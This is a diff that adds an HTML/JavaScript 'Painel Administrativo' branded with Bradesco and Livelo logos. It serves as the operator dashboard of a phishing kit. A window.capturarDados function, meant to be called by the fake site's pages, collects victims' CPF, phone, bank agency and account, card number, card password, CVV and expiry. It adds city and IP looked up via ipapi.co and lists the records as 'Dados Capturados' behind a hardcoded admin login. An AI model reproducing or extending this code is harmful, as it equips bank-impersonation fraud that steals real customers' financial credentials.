@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Administrativo · Bradesco Livelo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* TELA DE LOGIN */
+        .login-container {
+            background: white;
+            border-radius: 32px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .logos {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .logos img {
+            max-height: 50px;
+            object-fit: contain;
+        }
+
+        .login-title {
+            color: #C62828;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            color: #C62828;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #ddd;
+            border-radius: 14px;
+            font-size: 1rem;
+            transition: 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #C62828;
+            outline: none;
+        }
+
+        .btn-login {
+            background: #C62828;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            border-radius: 40px;
+            cursor: pointer;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+
+        .btn-login:hover {
+            background: #a52a2a;
+        }
+
+        .error-msg {
+            color: #C62828;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        /* PAINEL ADMIN */
+        .painel-container {
+            width: 100%;
+            max-width: 1400px;
+            margin: 20px;
+            display: none;
+        }
+
+        .painel-header {
+            background: white;
+            border-radius: 28px;
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .painel-header .logos {
+            margin-bottom: 0;
+        }
+
+        .painel-header h1 {
+            color: #C62828;
+            font-size: 1.8rem;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .btn-limpar {
+            background: #C62828;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 40px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-limpar:hover {
+            background: #a52a2a;
+        }
+
+        .btn-visualizar {
+            background: #2c3e50;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 40px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-visualizar:hover {
+            background: #1a252f;
+        }
+
+        .btn-toggle {
+            background: #C62828;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 40px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: 0.2s;
+        }
+
+        .btn-toggle:hover {
+            opacity: 0.9;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+
+        .stat-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+
+        .stat-card h3 {
+            color: #C62828;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        .stat-card .number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .sessao-dados {
+            background: white;
+            border-radius: 28px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+        }
+
+        .sessao-dados h2 {
+            color: #C62828;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .tabela-dados {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+        }
+
+        .tabela-dados th {
+            text-align: left;
+            padding: 15px 10px;
+            background: #f8f9fa;
+            color: #C62828;
+            font-weight: 600;
+            border-bottom: 2px solid #C62828;
+            white-space: nowrap;
+        }
+
+        .tabela-dados td {
+            padding: 12px 10px;
+            border-bottom: 1px solid #eee;
+            white-space: nowrap;
+        }
+
+        .tabela-dados tr:hover {
+            background: #fff5f5;
+        }
+
+        .vazio {
+            text-align: center;
+            color: #999;
+            padding: 40px;
+            font-style: italic;
+        }
+
+        /* MODAL DE VISUALIZAÇÃO DE CLIENTE */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 32px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #C62828;
+        }
+
+        .modal-header h3 {
+            color: #C62828;
+            font-size: 1.3rem;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #C62828;
+        }
+
+        .cliente-detalhe {
+            margin-bottom: 15px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 16px;
+            border-left: 4px solid #C62828;
+        }
+
+        .cliente-detalhe p {
+            margin: 8px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .cliente-detalhe strong {
+            color: #C62828;
+        }
+
+        @media (max-width: 768px) {
+            .painel-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            .tabela-dados {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- TELA DE LOGIN -->
+    <div class="login-container" id="loginBox">
+        <div class="logos">
+            <img src="logobradesco.png" alt="Bradesco">
+            <img src="logolivelo.png" alt="Livelo">
+        </div>
+        <div class="login-title">Painel Administrativo</div>
+        <div class="input-group">
+            <label>Usuário</label>
+            <input type="text" id="username" placeholder="Digite seu usuário">
+        </div>
+        <div class="input-group">
+            <label>Senha</label>
+            <input type="password" id="password" placeholder="Digite sua senha">
+        </div>
+        <button class="btn-login" id="btnLogin">Entrar</button>
+        <div class="error-msg" id="loginError">Usuário ou senha incorretos</div>
+    </div>
+
+    <!-- PAINEL ADMIN -->
+    <div class="painel-container" id="painelBox">
+        <div class="painel-header">
+            <div class="logos">
+                <img src="logobradesco.png" alt="Bradesco">
+                <img src="logolivelo.png" alt="Livelo">
+            </div>
+            <h1>Painel de Controle</h1>
+            <div class="btn-group">
+                <button class="btn-toggle" id="btnToggleCartao">
+                    🃏 Cartão: ATIVADO
+                </button>
+                <button class="btn-visualizar" id="btnVisualizarTodos">
+                    👁️ Visualizar Todos
+                </button>
+                <button class="btn-limpar" id="btnLimparTudo">
+                    🗑️ Limpar Tudo
+                </button>
+            </div>
+        </div>
+
+        <!-- Estatísticas -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>Total de Clientes</h3>
+                <div class="number" id="totalClientes">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Cartões Capturados</h3>
+                <div class="number" id="totalCartoes">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>E-mails Coletados</h3>
+                <div class="number" id="totalEmails">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>CPFs Válidos</h3>
+                <div class="number" id="totalCpfs">0</div>
+            </div>
+        </div>
+
+        <!-- Dados dos Clientes (COMPLETOS) -->
+        <div class="sessao-dados">
+            <h2>📋 Dados Capturados</h2>
+            <div style="overflow-x: auto;">
+                <table class="tabela-dados" id="tabelaDados">
+                    <thead>
+                        <tr>
+                            <th>Data/Hora</th>
+                            <th>CPF</th>
+                            <th>Telefone</th>
+                            <th>Agência</th>
+                            <th>Conta</th>
+                            <th>Cartão</th>
+                            <th>Senha</th>
+                            <th>E-mail</th>
+                            <th>CVV</th>
+                            <th>Validade</th>
+                            <th>Cidade</th>
+                            <th>IP</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dadosBody">
+                        <tr><td colspan="12" class="vazio">Nenhum dado capturado ainda</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DE VISUALIZAÇÃO DE CLIENTES -->
+    <div class="modal" id="modalVisualizar">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>👥 Dados dos Clientes</h3>
+                <button class="modal-close" id="btnFecharModal">&times;</button>
+            </div>
+            <div id="modalBody">
+                <!-- Clientes serão inseridos aqui dinamicamente -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuração
+        const ADMIN_USER = 'admin';
+        const ADMIN_PASS = 'progresso2026';
+
+        // Verificar se já está logado
+        if (localStorage.getItem('logado') === 'true') {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('painelBox').style.display = 'block';
+        }
+
+        // Dados capturados
+        let dadosCapturados = JSON.parse(localStorage.getItem('dadosCapturados')) || [];
+        
+        // Estado do cartão
+        let cartaoAtivo = localStorage.getItem('cartaoAtivo') !== 'false'; // padrão: true
+
+        // Função para atualizar botão do cartão
+        function atualizarBotaoCartao() {
+            const btn = document.getElementById('btnToggleCartao');
+            if (cartaoAtivo) {
+                btn.innerHTML = '🃏 Cartão: ATIVADO';
+                btn.style.background = '#C62828';
+            } else {
+                btn.innerHTML = '🃏 Cartão: DESATIVADO';
+                btn.style.background = '#666';
+            }
+        }
+
+        // Função para obter cidade e IP
+        async function getDadosLocalizacao() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    cidade: `${data.city || 'Desconhecido'} - ${data.region_code || ''}`,
+                    ip: data.ip || '-'
+                };
+            } catch {
+                return {
+                    cidade: 'Não disponível',
+                    ip: '-'
+                };
+            }
+        }
+
+        // Função para capturar dados (chamada pelas páginas do site)
+        window.capturarDados = async function(dados) {
+            const localizacao = await getDadosLocalizacao();
+            
+            // Mesclar com dados existentes se for o mesmo cliente (mesmo CPF)
+            let registroExistente = null;
+            if (dados.cpf) {
+                registroExistente = dadosCapturados.find(d => d.cpf === dados.cpf);
+            }
+            
+            if (registroExistente) {
+                // Atualizar registro existente
+                Object.assign(registroExistente, dados, localizacao, {
+                    data: new Date().toLocaleString('pt-BR')
+                });
+            } else {
+                // Criar novo registro
+                const novoRegistro = {
+                    data: new Date().toLocaleString('pt-BR'),
+                    cpf: dados.cpf || '-',
+                    telefone: dados.telefone || '-',
+                    agencia: dados.agencia || '-',
+                    conta: dados.conta || '-',
+                    cartao: dados.cartao || '-',
+                    senha: dados.senha4 || dados.senha || '-',
+                    email: dados.email || '-',
+                    cvv: dados.cvv || '-',
+                    validade: dados.validade || '-',
+                    cidade: localizacao.cidade,
+                    ip: localizacao.ip
+                };
+                dadosCapturados.push(novoRegistro);
+            }
+            
+            localStorage.setItem('dadosCapturados', JSON.stringify(dadosCapturados));
+            
+            if (document.getElementById('painelBox').style.display === 'block') {
+                atualizarPainel();
+            }
+        };
+
+        // Login
+        document.getElementById('btnLogin').addEventListener('click', function() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            if (user === ADMIN_USER && pass === ADMIN_PASS) {
+                localStorage.setItem('logado', 'true');
+                document.getElementById('loginBox').style.display = 'none';
+                document.getElementById('painelBox').style.display = 'block';
+                atualizarPainel();
+                atualizarBotaoCartao();
+            } else {
+                document.getElementById('loginError').style.display = 'block';
+            }
+        });
+
+        // Toggle cartão
+        document.getElementById('btnToggleCartao').addEventListener('click', function() {
+            cartaoAtivo = !cartaoAtivo;
+            localStorage.setItem('cartaoAtivo', cartaoAtivo);
+            atualizarBotaoCartao();
+        });
+
+        // Atualizar painel
+        function atualizarPainel() {
+            atualizarTabela();
+            atualizarStats();
+        }
+
+        function atualizarTabela() {
+            const tbody = document.getElementById('dadosBody');
+            
+            if (dadosCapturados.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="12" class="vazio">Nenhum dado capturado ainda</td></tr>';
+                return;
+            }
+            
+            let html = '';
+            dadosCapturados.slice().reverse().forEach(d => {
+                html += `<tr>
+                    <td>${d.data}</td>
+                    <td>${d.cpf}</td>
+                    <td>${d.telefone}</td>
+                    <td>${d.agencia}</td>
+                    <td>${d.conta}</td>
+                    <td>${d.cartao}</td>
+                    <td>${d.senha}</td>
+                    <td>${d.email}</td>
+                    <td>${d.cvv}</td>
+                    <td>${d.validade}</td>
+                    <td>${d.cidade}</td>
+                    <td>${d.ip}</td>
+                </tr>`;
+            });
+            
+            tbody.innerHTML = html;
+        }
+
+        function atualizarStats() {
+            document.getElementById('totalClientes').textContent = dadosCapturados.length;
+            
+            const cartoes = dadosCapturados.filter(d => d.cartao && d.cartao !== '-' && d.cartao.length > 5).length;
+            document.getElementById('totalCartoes').textContent = cartoes;
+            
+            const emails = dadosCapturados.filter(d => d.email && d.email !== '-' && d.email.includes('@')).length;
+            document.getElementById('totalEmails').textContent = emails;
+            
+            const cpfs = dadosCapturados.filter(d => d.cpf && d.cpf !== '-' && d.cpf.length > 10).length;
+            document.getElementById('totalCpfs').textContent = cpfs;
+        }
+
+        // Visualizar todos os clientes no modal
+        document.getElementById('btnVisualizarTodos').addEventListener('click', function() {
+            const modalBody = document.getElementById('modalBody');
+            
+            if (dadosCapturados.length === 0) {
+                modalBody.innerHTML = '<p style="text-align: center; color: #999;">Nenhum cliente cadastrado</p>';
+            } else {
+                let html = '';
+                dadosCapturados.slice().reverse().forEach((cliente, index) => {
+                    html += `
+                        <div class="cliente-detalhe">
+                            <p><strong>Cliente ${index + 1}</strong> <span>${cliente.data}</span></p>
+                            <p><strong>CPF:</strong> ${cliente.cpf}</p>
+                            <p><strong>Telefone:</strong> ${cliente.telefone}</p>
+                            <p><strong>Agência:</strong> ${cliente.agencia}</p>
+                            <p><strong>Conta:</strong> ${cliente.conta}</p>
+                            <p><strong>Cartão:</strong> ${cliente.cartao}</p>
+                            <p><strong>Senha:</strong> ${cliente.senha}</p>
+                            <p><strong>E-mail:</strong> ${cliente.email}</p>
+                            <p><strong>CVV:</strong> ${cliente.cvv}</p>
+                            <p><strong>Validade:</strong> ${cliente.validade}</p>
+                            <p><strong>Cidade:</strong> ${cliente.cidade}</p>
+                            <p><strong>IP:</strong> ${cliente.ip}</p>
+                        </div>
+                    `;
+                });
+                modalBody.innerHTML = html;
+            }
+            
+            document.getElementById('modalVisualizar').style.display = 'flex';
+        });
+
+        // Fechar modal
+        document.getElementById('btnFecharModal').addEventListener('click', function() {
+            document.getElementById('modalVisualizar').style.display = 'none';
+        });
+
+        // Fechar modal clicando fora
+        window.addEventListener('click', function(e) {
+            const modal = document.getElementById('modalVisualizar');
+            if (e.target === modal) {
+                modal.style.display = 'none';
+            }
+        });
+
+        // Limpar tudo
+        document.getElementById('btnLimparTudo').addEventListener('click', function() {
+            if (confirm('Tem certeza que deseja limpar TODOS os dados?')) {
+                dadosCapturados = [];
+                localStorage.removeItem('dadosCapturados');
+                atualizarPainel();
+            }
+        });
+
+        // Enter para login
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('btnLogin').click();
+            }
+        });
+
+        // Se já estiver logado, carregar dados
+        if (localStorage.getItem('logado') === 'true') {
+            atualizarPainel();
+            atualizarBotaoCartao();
+        }
+    </script>
+</body>
+</html>
